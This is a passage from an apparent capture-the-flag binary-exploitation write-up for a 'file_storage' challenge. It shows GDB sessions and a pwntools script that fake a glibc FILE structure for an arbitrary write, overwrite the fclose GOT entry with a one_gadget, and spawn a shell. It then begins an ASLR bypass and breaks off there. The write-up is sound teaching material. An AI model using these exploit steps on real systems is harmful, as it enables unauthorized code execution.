Breakpoint 1, <span class="code-dark-blue">0x0000000000401789</span> in <span class="code-dark-yellow">main</span> ()
</code></pre></div><p>We reach the breakpoint. Now we can see the offset to overwrite the <code>FILE</code> pointer that is passed to <code>fprintf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x401789</span> &lt;<span class="code-dark-yellow">main</span>+741&gt;: call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;
<span class="code-green">gef‚û§  </span>x/gx $rdi
<span class="code-dark-blue">0x626161616161616c</span>:     Cannot access memory at address 0x626161616161616c  
<span class="code-green">gef‚û§  </span>x/gx $rsi
<span class="code-dark-blue">0x40212e</span>:       0x626d756e00732520
<span class="code-green">gef‚û§  </span>x/gx $rdx
<span class="code-dark-blue">0x7fffffffe5a0</span>: 0x6161616161616161
</code></pre></div><p>We see that we overwrote <code>$rdi</code> with some characters of the pattern string, so we can potentially control the address of the <code>FILE</code> pointer <code>fp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>pattern offset $rdi
<span class="code-blue">[+]</span> Searching for '6c61616161616162'/'626161616161616c' with period=8  
<span class="code-green">[+]</span> Found at offset 288 (little-endian search) <span class="code-red">likely</span>
<span class="code-green">gef‚û§  </span>quit
</code></pre></div><p>Nice, now the idea is to enter a pointer to an address on the stack that contains a fake <code>FILE</code> structure that will write arbitrary data at a specific address of memory.</p><p>Just for testing, let&rsquo;s disable ASLR locally to make things easier:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 0 | <span class="code-dark-green mtku">sudo</span> <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
[sudo] password for rocky:
0
</code></pre></div><p>Now let&rsquo;s visualize a normal <code>FILE</code> structure:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">file_storage</span>
Reading symbols from <span class="code-dark-green">file_storage</span>...
(No debugging symbols found in <span class="code-dark-green">file_storage</span>)
<span class="code-red">gef‚û§  </span>break *main+741
Breakpoint 1 at <span class="code-dark-blue">0x401789</span>
<span class="code-red">gef‚û§  </span>run
Starting program: ./file_storage  
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 2
Enter content:
AAAA

Breakpoint 1, <span class="code-dark-blue">0x0000000000401789</span> in <span class="code-dark-yellow">main</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>x/30gx $rdi
<span class="code-dark-blue">0x4056b0</span>:       0x00000000fbad2484      0x0000000000000000  
<span class="code-dark-blue">0x4056c0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4056d0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4056e0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4056f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405700</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405710</span>:       0x0000000000000000      0x00007ffff7fc45c0
<span class="code-dark-blue">0x405720</span>:       0x0000000000000003      0x0000000000000000
<span class="code-dark-blue">0x405730</span>:       0x0000000000000000      0x0000000000405790
<span class="code-dark-blue">0x405740</span>:       0xffffffffffffffff      0x0000000000000000
<span class="code-dark-blue">0x405750</span>:       0x00000000004057a0      0x0000000000000000
<span class="code-dark-blue">0x405760</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405770</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405780</span>:       0x0000000000000000      0x00007ffff7fc04a0
<span class="code-dark-blue">0x405790</span>:       0x0000000000000000      0x0000000000000000
<span class="code-green">gef‚û§  </span>p *(FILE*) $rdi
$1 = {
  _flags = 0xfbad2484,
  _IO_read_ptr = <span class="code-dark-blue">0x0</span>,
  _IO_read_end = <span class="code-dark-blue">0x0</span>,
  _IO_read_base = <span class="code-dark-blue">0x0</span>,
  _IO_write_base = <span class="code-dark-blue">0x0</span>,
  _IO_write_ptr = <span class="code-dark-blue">0x0</span>,
  _IO_write_end = <span class="code-dark-blue">0x0</span>,
  _IO_buf_base = <span class="code-dark-blue">0x0</span>,
  _IO_buf_end = <span class="code-dark-blue">0x0</span>,
  _IO_save_base = <span class="code-dark-blue">0x0</span>,
  _IO_backup_base = <span class="code-dark-blue">0x0</span>,
  _IO_save_end = <span class="code-dark-blue">0x0</span>,
  _markers = <span class="code-dark-blue">0x0</span>,
  _chain = <span class="code-dark-blue">0x7ffff7fc45c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>&gt;,
  _fileno = 0x3,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = <span class="code-dark-blue">0x405790</span>,
  _offset = 0xffffffffffffffff,
  _codecvt = <span class="code-dark-blue">0x0</span>,
  _wide_data = <span class="code-dark-blue">0x4057a0</span>,
  _freeres_list = <span class="code-dark-blue">0x0</span>,
  _freeres_buf = <span class="code-dark-blue">0x0</span>,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\000' &lt;repeats 19 times&gt;
}
<span class="code-green">gef‚û§  </span>x 0x00007ffff7fa74a0
<span class="code-dark-blue">0x7ffff7fa74a0</span>: 0x0000000dfff983c0
</code></pre></div><p>The way to exploit this <code>FILE</code> structure to achieve an arbitrary write primitive is adding a certain address in <code>_IO_buf_base</code> (and the same value plus <code>8</code> in <code>_IO_buf_end</code>). More information at <a href="https://4ngelboy.blogspot.com/2017/11/play-with-file-structure-yet-another.html">angelboy.tw</a>.</p><p>For example, we can try to modify the name of an environment variable loaded in the stack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>grep USER
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">USER</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
  0x7fffffffeea7 - 0x7fffffffeeb1  ‚Üí   "<span class="code-dark-magenta">USER=rocky</span>"
</code></pre></div><p>Since ASLR is disabled temporarily, this address will be static. Let&rsquo;s update the Python script and attach GDB to the process:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">_lock</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3">#_lock = 0x405790   (Just a writable address, i.e. stack)</span>  

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">fbad2484</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_2_1_stderr_</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">3</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">_lock</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\xff</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">_lock</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_file_jumps</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">payload</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk3"># ...</span>

<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break *main+741</span><span class="mtk6">\n</span><span class="mtk4">continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">288</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffeeed</span>, <span class="mtk7 mtki">0x</span><span class="mtk6">405790</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(yes/no): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'yes'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'content:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>The function named <code>fsop</code> will create the fake <code>FILE</code> structure. Alternatively, we can use <a href="https://docs.pwntools.com/en/stable/filepointer.html"><code>FileStructure</code> from <code>pwntools</code></a>.</p><p>We do not know yet the address where the malicious <code>FILE</code> structure will be placed, so we are using a dummy address <code>BBBBBBBB</code>. If we run it, we can continue until it reaches the breakpoint right before <code>fprintf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>grep USER
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">USER</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffeeed - 0x7fffffffeef7  ‚Üí   "<span class="code-dark-magenta">USER=rocky</span>"
<span class="code-green">gef‚û§  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x401789</span> &lt;<span class="code-dark-yellow">main</span>+741&gt;: call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;
<span class="code-green">gef‚û§  </span>x/gx $rdi
<span class="code-dark-blue">0x4242424242424242</span>:     Cannot access memory at address 0x4242424242424242  
<span class="code-green">gef‚û§  </span>x/gx $rsi
<span class="code-dark-blue">0x40212e</span>:       0x626d756e00732520
<span class="code-green">gef‚û§  </span>x/gx $rdx
<span class="code-dark-blue">0x7fffffffe600</span>: 0x5858585858585858
<span class="code-green">gef‚û§  </span>x/30gx $rdx
<span class="code-dark-blue">0x7fffffffe600</span>: 0x5858585858585858      0x00000000fbad2484
<span class="code-dark-blue">0x7fffffffe610</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe620</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe630</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe640</span>: 0x00007fffffffeed6      0x00007fffffffeede
<span class="code-dark-blue">0x7fffffffe650</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe660</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe670</span>: 0x00007ffff7fc45c0      0x0000000000000003
<span class="code-dark-blue">0x7fffffffe680</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe690</span>: 0x0000000000405790      0xffffffffffffffff
<span class="code-dark-blue">0x7fffffffe6a0</span>: 0x0000000000000000      0x00000000004057a0
<span class="code-dark-blue">0x7fffffffe6b0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe6c0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe6d0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe6e0</span>: 0x00007ffff7fc04a0      0x4141414141414141
</code></pre></div><p>At this point we see that the fake <code>FILE</code> structure is placed at <code>0x7fffffffe608</code> in the stack. Notice as well that the address of the environment variable changed when running GDB through the Python exploit. Now, we can replace <code>BBBBBBBB</code> for <code>p64(0x7fffffffe608)</code> and re-run the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>grep USER
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">USER</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffeeed - 0x7fffffffeef7  ‚Üí   "<span class="code-dark-magenta">USER=rocky</span>"
<span class="code-green">gef‚û§  </span>x/s 0x7fffffffeeed
<span class="code-dark-blue">0x7fffffffeeed</span>: "USER=rocky"
<span class="code-green">gef‚û§  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x401789</span> &lt;<span class="code-dark-yellow">main</span>+741&gt;: call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;  
<span class="code-green">gef‚û§  </span>x/gx $rdi
<span class="code-dark-blue">0x7fffffffe608</span>: 0x00000000fbad2484
<span class="code-green">gef‚û§  </span>x/gx $rdx
<span class="code-dark-blue">0x7fffffffe600</span>: 0x5858585858585858
<span class="code-green">gef‚û§  </span>p *(FILE *) $rdi
$1 = {
  _flags = 0xfbad2484,
  _IO_read_ptr = <span class="code-dark-blue">0x0</span>,
  _IO_read_end = <span class="code-dark-blue">0x0</span>,
  _IO_read_base = <span class="code-dark-blue">0x0</span>,
  _IO_write_base = <span class="code-dark-blue">0x0</span>,
  _IO_write_ptr = <span class="code-dark-blue">0x0</span>,
  _IO_write_end = <span class="code-dark-blue">0x0</span>,
  _IO_buf_base = <span class="code-dark-blue">0x7fffffffeeed</span> "USER=rocky",
  _IO_buf_end = <span class="code-dark-blue">0x7fffffffeef5</span> "ky",
  _IO_save_base = <span class="code-dark-blue">0x0</span>,
  _IO_backup_base = <span class="code-dark-blue">0x0</span>,
  _IO_save_end = <span class="code-dark-blue">0x0</span>,
  _markers = <span class="code-dark-blue">0x0</span>,
  _chain = <span class="code-dark-blue">0x7ffff7fc45c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>&gt;,
  _fileno = 0x3,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = <span class="code-dark-blue">0x405790</span>,
  _offset = 0xffffffffffffffff,
  _codecvt = <span class="code-dark-blue">0x0</span>,
  _wide_data = <span class="code-dark-blue">0x4057a0</span>,
  _freeres_list = <span class="code-dark-blue">0x0</span>,
  _freeres_buf = <span class="code-dark-blue">0x0</span>,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\000' &lt;repeats 19 times&gt;
}
<span class="code-green">gef‚û§  </span>ni
<span class="code-dark-blue">0x000000000040178e</span> in <span class="code-dark-yellow">main</span> ()
</code></pre></div><p>The <code>FILE</code> structure seems right. And indeed, the environment variable has changed (from <code>USER=rocky</code> to <code>XXXXXXXXky</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>x/s 0x7fffffffeeed
<span class="code-dark-blue">0x7fffffffeeed</span>: "XXXXXXXXky"  
</code></pre></div><h2 id="exploit-development">Exploit development</h2><p>Perfect, we have a write primitive. Now we can try to change an entry of the GOT. After <code>fprintf</code> we only have calls to <code>fclose</code>, <code>puts</code>, <code>sleep</code>, <code>system</code> and <code>exit</code>.</p><p>The idea is to overwrite <code>fclose</code> in the Global Offset Table (GOT) with a <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell, which can be done with a single FSOP payload.</p><p>We choose to modify <code>fclose</code> because the legitimate <code>fclose</code> will fail because the <code>FILE</code> is not completely valid (it will crash with an <code>invalid free() pointer</code> error). Hence, the best idea is to overwrite the GOT entry for <code>fclose</code> with the address of a <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">one_gadget</span> <span class="mtku">libc.so.6</span>
<span class="rb-purple">0xe3afe</span> execve("/bin/sh", <span class="rb-dark-green">r15</span>, <span class="rb-dark-green">r12</span>)  
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">r15</span>] == NULL || <span class="rb-dark-green">r15</span> == NULL
  [<span class="rb-dark-green">r12</span>] == NULL || <span class="rb-dark-green">r12</span> == NULL

<span class="rb-purple">0xe3b01</span> execve("/bin/sh", <span class="rb-dark-green">r15</span>, <span class="rb-dark-green">rdx</span>)
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">r15</span>] == NULL || <span class="rb-dark-green">r15</span> == NULL
  [<span class="rb-dark-green">rdx</span>] == NULL || <span class="rb-dark-green">rdx</span> == NULL

<span class="rb-purple">0xe3b04</span> execve("/bin/sh", <span class="rb-dark-green">rsi</span>, <span class="rb-dark-green">rdx</span>)
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">rsi</span>] == NULL || <span class="rb-dark-green">rsi</span> == NULL
  [<span class="rb-dark-green">rdx</span>] == NULL || <span class="rb-dark-green">rdx</span> == NULL
</code></pre></div><h3 id="without-aslr">Without ASLR</h3><p>For the moment, let&rsquo;s modify the GOT. This is the updated Python exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">_lock</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk3"># ...</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">288</span>
<span class="mtk1">    </span><span class="mtk1">one_gadgets</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">0x</span><span class="mtk6">e3afe</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e3b01</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e3b04</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">one_gadgets</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">])</span>  
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span>elf<span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.fclose, </span><span class="mtk7 mtki">0x</span><span class="mtk6">405790</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'<span class="mtk6">\0</span>'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe538</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(yes/no): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'yes'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'content:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1651498
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1651498)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1651578
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1651578)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1651580
[<span class="code-green">+</span>] Filename: PT.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1651580)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1651638
[<span class="code-blue">*</span>] Leaked puts() address: 0x7ffff7e5b420
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dd7000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
file_storage  ld-linux-x86-64.so.2  libc.so.6  solve.py
</code></pre></div><p>Alright we have successfully got an interactive shell.</p><p>Nevertheless, we are not done yet. Now we must handle ASLR for the stack addresses (remember that we have disabled it temporarily).</p><h3 id="with-aslr">With ASLR</h3><p>To bypass stack ASLR, we need to leak an address of the stack at runtime. This can be done using the Format String vulnerability and computing our addresses for the <code>FILE</code> structure using offsets.</p><p>The leakage must be done before leaking the function address from Glibc (because we are reading a file and we will only be able to write, not to read again).</p><p>Luckily for us, it turns out that <code>%1$p</code> leaks a stack address (<code>0x7fffffffbfa0</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
